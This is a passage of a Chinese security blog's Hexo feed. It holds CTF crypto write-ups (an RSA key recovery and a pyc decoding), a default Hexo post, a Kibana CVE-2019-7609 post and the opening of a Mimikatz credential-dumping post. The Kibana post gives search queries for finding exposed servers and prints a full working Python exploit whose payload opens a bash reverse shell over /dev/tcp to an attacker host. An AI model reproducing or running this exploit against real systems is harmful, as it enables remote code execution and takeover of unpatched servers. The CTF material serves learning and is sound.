<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8BNormal_RSA/image-20231122200001226.png" class title="image-20231122200001226">

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e=65537</span><br><span class="line">n=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD(十六进制)</span><br><span class="line">n=87924348264132406875276140514499937145050893665602592992418171647042491658461</span><br></pre></td></tr></table></figure>

<p>第二种方法使用Crypto.PublicKey库解析公钥及生成私钥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pubkey.pem&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = f.read()</span><br><span class="line">    pubkey = RSA.import_key(key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n:&#x27;</span>,pubkey.n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e:&#x27;</span>,pubkey.e)</span><br></pre></td></tr></table></figure>

<p><strong>因式分解</strong></p>
<p>使用工具对大整数进行因式分解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">q= 275127860351348928173285174381581152299</span><br><span class="line">p= 319576316814478949870590164193048041239</span><br></pre></td></tr></table></figure>

<p><strong>计算欧拉函数</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">q= <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">p= <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line"></span><br><span class="line">oula = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(oula)</span><br><span class="line"></span><br><span class="line">d = inverse(pubkey.e,oula)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>

<p>得到d私钥为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10866948760844599168252082612378495977388271279679231539839049698621994994673</span><br></pre></td></tr></table></figure>

<p><strong>输出私钥</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prikey = RSA.construct((pubkey.n,pubkey.e,d),<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;prikey.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = prikey.export_key()</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line">    f.write(key)</span><br></pre></td></tr></table></figure>

<p>输出文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIGqAgEAAiEAwmNq5cPY5D/7l6sJAo8arGwL9s09cOvKKBv/6X++MN0CAwEAAQIg</span><br><span class="line">GAZ5m9RM5kkSK3i0MGDHhvi3f7FZPghC2gY7oNhyi/ECEQDO+7LPfhipjr7cNuPn</span><br><span class="line">w7ArAhEA8Gwo6RyJIrnCNuI1YMCXFwIRAJulRkclqWIHx5pNZIAp9VUCEGjeJLIZ</span><br><span class="line">ek+lSut5m+LJ3p0CEDRBEd7C622/wt1+58xOIfE=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p><strong>解密文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl pkeyutl -decrypt -in flag.enc -inkey prikey.pem</span><br></pre></td></tr></table></figure>

<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8BNormal_RSA/image-20231122204207210.png" class title="image-20231122204207210">

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PCTF&#123;256b_i5_m3dium&#125;</span><br></pre></td></tr></table></figure>





<p>完整代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,inverse</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pubkey.pem&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = f.read()</span><br><span class="line">    pubkey = RSA.import_key(key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n:&#x27;</span>,pubkey.n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e:&#x27;</span>,pubkey.e)</span><br><span class="line"></span><br><span class="line">q= <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">p= <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line"></span><br><span class="line">oula = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(oula)</span><br><span class="line"></span><br><span class="line">d = inverse(pubkey.e,oula)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">prikey = RSA.construct((pubkey.n,pubkey.e,d),<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;prikey.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = prikey.export_key()</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line">    f.write(key)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>-CTF -Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/05/15/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>-博客测试</tag>
      </tags>
  </entry>
  <entry>
    <title>kibana未授权访问利用</title>
    <url>/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="kibana未授权访问利用"><a href="#kibana未授权访问利用" class="headerlink" title="kibana未授权访问利用"></a>kibana未授权访问利用</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成少数据泄露。在默认配置下，Kibana就可以访问<a href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=Elasticsearch">Elasticsearch</a>中的所有数据。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Kibana &lt; 5.6.15</p>
<p>Kibana &lt; 6.6.1</p>
<h2 id="搜索规则"><a href="#搜索规则" class="headerlink" title="搜索规则"></a>搜索规则</h2><p>zoomeye:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;kibana&quot;</span><br></pre></td></tr></table></figure>



<p>Fofa:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;kibana&quot;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问kibana系统</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.211.129:5601/app/kibana</span><br></pre></td></tr></table></figure>



<p>无需账号密码就可以登录进入图形化界面</p>
<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125150723328.png" class title="image-20211125150723328">



<p>下面利用脚本进行攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python CVE-2019-7609-kibana-rce.py -u 目标主机ip地址:5601 -host 攻击主机ip地址 -port 监听端口 –-shell</span><br></pre></td></tr></table></figure>

<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125162717040.png" class title="image-20211125162717040">



<p>反弹shell成功</p>
<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125162801162.png" class title="image-20211125162801162">



<h2 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h2><p>poc地址 :</p>
<p><a href="https://github.com/LandGrey/CVE-2019-7609">LandGrey&#x2F;CVE-2019-7609: exploit CVE-2019-7609(kibana RCE) on right way by python2 scripts (github.com)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># Build By LandGrey</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">from</span> distutils.version <span class="keyword">import</span> StrictVersion</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_kibana_version</span>(<span class="params">url</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url.rstrip(<span class="string">&quot;/&quot;</span>), <span class="string">&quot;/app/kibana&quot;</span>)</span><br><span class="line">    r = requests.get(url, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">30</span>)</span><br><span class="line">    patterns = [<span class="string">&#x27;&amp;quot;version&amp;quot;:&amp;quot;(.*?)&amp;quot;,&#x27;</span>, <span class="string">&#x27;&quot;version&quot;:&quot;(.*?)&quot;,&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> patterns:</span><br><span class="line">        match = re.findall(pattern, r.content)</span><br><span class="line">        <span class="keyword">if</span> match:</span><br><span class="line">            <span class="keyword">return</span> match[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;9.9.9&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">version_compare</span>(<span class="params">standard_version, compare_version</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sc1 = StrictVersion(standard_version[<span class="number">0</span>])</span><br><span class="line">        sc2 = StrictVersion(standard_version[<span class="number">1</span>])</span><br><span class="line">        cc = StrictVersion(compare_version)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] ERROR : kibana version compare failed !&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sc1 &gt; cc <span class="keyword">or</span> (StrictVersion(<span class="string">&quot;6.0.0&quot;</span>) &lt;= cc <span class="keyword">and</span> sc2 &gt; cc):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">global</span> version</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> version <span class="keyword">or</span> <span class="keyword">not</span> version_compare([<span class="string">&quot;5.6.15&quot;</span>, <span class="string">&quot;6.6.1&quot;</span>], version):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;kbn-version&#x27;</span>: version,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;sheet&quot;:[&quot;.es(*)&quot;],&quot;time&quot;:&#123;&quot;from&quot;:&quot;now-1m&quot;,&quot;to&quot;:&quot;now&quot;,&quot;mode&quot;:&quot;quick&quot;,&quot;interval&quot;:&quot;auto&quot;,&quot;timezone&quot;:&quot;Asia/Shanghai&quot;&#125;&#125;&#x27;</span></span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url.rstrip(<span class="string">&quot;/&quot;</span>), <span class="string">&quot;/api/timelion/run&quot;</span>)</span><br><span class="line">    r = requests.post(url, data=data, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;application/json&#x27;</span> <span class="keyword">in</span> r.headers.get(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;&quot;seriesList&quot;&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">target, ip, port</span>):</span></span><br><span class="line">    random_name = <span class="string">&quot;&quot;</span>.join(random.sample(<span class="string">&#x27;qwertyuiopasdfghjkl&#x27;</span>, <span class="number">8</span>))</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;kbn-version&#x27;</span>: version,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">r&#x27;&#x27;&#x27;&#123;&quot;sheet&quot;:[&quot;.es(*).props(label.__proto__.env.AAAA=&#x27;require(\&quot;child_process\&quot;).exec(\&quot;if [ ! -f /tmp/%s ];then touch /tmp/%s &amp;&amp; /bin/bash -c \\&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\\&#x27;; fi\&quot;);process.exit()//&#x27;)\n.props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)&quot;],&quot;time&quot;:&#123;&quot;from&quot;:&quot;now-15m&quot;,&quot;to&quot;:&quot;now&quot;,&quot;mode&quot;:&quot;quick&quot;,&quot;interval&quot;:&quot;10s&quot;,&quot;timezone&quot;:&quot;Asia/Shanghai&quot;&#125;&#125;&#x27;&#x27;&#x27;</span> % (random_name, random_name, ip, port)</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target, <span class="string">&quot;/api/timelion/run&quot;</span>)</span><br><span class="line">    r1 = requests.post(url, data=data, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> r1.status_code == <span class="number">200</span>:</span><br><span class="line">        trigger_url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target, <span class="string">&quot;/socket.io/?EIO=3&amp;transport=polling&amp;t=MtjhZoM&quot;</span>)</span><br><span class="line">        new_headers = headers</span><br><span class="line">        new_headers.update(&#123;<span class="string">&#x27;kbn-xsrf&#x27;</span>: <span class="string">&#x27;professionally-crafted-string-of-text&#x27;</span>&#125;)</span><br><span class="line">        r2 = requests.get(trigger_url, verify=<span class="literal">False</span>, headers=new_headers, timeout=<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">if</span> r2.status_code == <span class="number">200</span>:</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, dest=<span class="string">&#x27;url&#x27;</span>, default=<span class="string">&quot;http://127.0.0.1:5601&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;such as: http://127.0.0.1:5601&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-host&quot;</span>, dest=<span class="string">&#x27;remote_host&#x27;</span>, default=<span class="string">&quot;127.0.0.1&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell remote host: such as: 1.1.1.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-port&quot;</span>, dest=<span class="string">&#x27;remote_port&#x27;</span>, default=<span class="string">&quot;8888&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell remote port: such as: 8888&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--shell&#x27;</span>, dest=<span class="string">&#x27;reverse_shell&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell after verify&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        sys.argv.append(<span class="string">&#x27;-h&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    target = args.url</span><br><span class="line">    remote_host = args.remote_host</span><br><span class="line">    remote_port = args.remote_port</span><br><span class="line">    is_reverse_shell = args.reverse_shell</span><br><span class="line"></span><br><span class="line">    target = target.rstrip(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;://&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">        target = <span class="string">&quot;http://&quot;</span> + target</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        version = get_kibana_version(target)</span><br><span class="line">        result = verify(target)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] &#123;&#125; maybe exists CVE-2019-7609 (kibana &lt; 6.6.1 RCE) vulnerability&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line">            <span class="keyword">if</span> is_reverse_shell:</span><br><span class="line">                result = reverse_shell(target, remote_host, remote_port)</span><br><span class="line">                <span class="keyword">if</span> result:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[+] reverse shell completely! please check session on: &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(remote_host, remote_port))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[-] cannot reverse shell&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] &#123;&#125; do not exists CVE-2019-7609 vulnerability&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] cannot exploit!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error on: \n&quot;</span>)</span><br><span class="line">        traceback.print_exc()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/weixin_43061533/article/details/111695028">(44条消息) Kibana未授权访问漏洞复现、CVE-2019-7609 Kibana远程代码执行漏洞复现_coc.的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web应用漏洞</category>
        <category>Kibana</category>
      </categories>
      <tags>
        <tag>-web应用漏洞 - Kibana -命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Crypto系列之easychallenge</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8Beasychallenge/</url>
    <content><![CDATA[<h1 id="【攻防世界】Crypto系列之easychallenge"><a href="#【攻防世界】Crypto系列之easychallenge" class="headerlink" title="【攻防世界】Crypto系列之easychallenge"></a>【攻防世界】Crypto系列之easychallenge</h1><p>这道题的附件是一个pyc文件，pyc是python代码经过编译器python虚拟机编译后生成的二进制文件，所以需要对其进行反编译获取其源代码</p>
<p>这里使用第三方python反编译器uncompyle6来进行反编译，首先使用pip安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install uncompyle6</span><br></pre></td></tr></table></figure>

<p>安装完成后，对pyc文件进行反编译获取源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uncompyle6 -o easychallenge.py easychallenge.pyc</span><br></pre></td></tr></table></figure>

<p>源代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.0</span></span><br><span class="line"><span class="comment"># Python bytecode version base 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.9 (tags/v3.8.9:a743f81, Apr  6 2021, 14:02:34) [MSC v.1928 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: ans.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2018-08-09 11:29:44</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode1</span>(<span class="params">ans</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) ^ <span class="number">36</span></span><br><span class="line">        x = x + <span class="number">25</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode2</span>(<span class="params">ans</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) + <span class="number">36</span></span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode3</span>(<span class="params">ans</span>):</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32encode(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Please Input your flag:&#x27;</span></span><br><span class="line">flag = raw_input()</span><br><span class="line">final = <span class="string">&#x27;UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===&#x27;</span></span><br><span class="line"><span class="keyword">if</span> encode3(encode2(encode1(flag))) == final:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;correct&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;wrong&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上述代码就是将flag经过encode1()、encode2()和encode3()这三个函数处理后得到一串base64编码，只要将其一步一步进行反推复原即可推出flag</p>
<p>反推步骤：</p>
<ul>
<li>调用base64.b32decode()解base64编码</li>
<li>调用decode2()对字符串进行**(i ^ 36) - 36**计算操作</li>
<li>调用decode1()对字符串进行**(ord(i) -25)^36**计算操作</li>
</ul>
<p>代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">final = <span class="string">&#x27;UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode3</span>(<span class="params">ans</span>):</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32decode(ans)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode2</span>(<span class="params">ans</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        i = (i ^ <span class="number">36</span>) - <span class="number">36</span></span><br><span class="line">        s += <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode1</span>(<span class="params">ans</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        i = (<span class="built_in">ord</span>(i) -<span class="number">25</span>)^<span class="number">36</span></span><br><span class="line">        s += <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decode1(decode2(decode3(final))))</span><br></pre></td></tr></table></figure>

<p>得到flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyberpeace&#123;interestinghhhhh&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>-CTF -Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Mimikatz使用</title>
    <url>/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>Mimikatz是一款后渗透测试工具，它能够从Windows认证(LSASS)的进程中获取内存，并且获取明文密码和NTLM哈希值的工具. lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！</p>
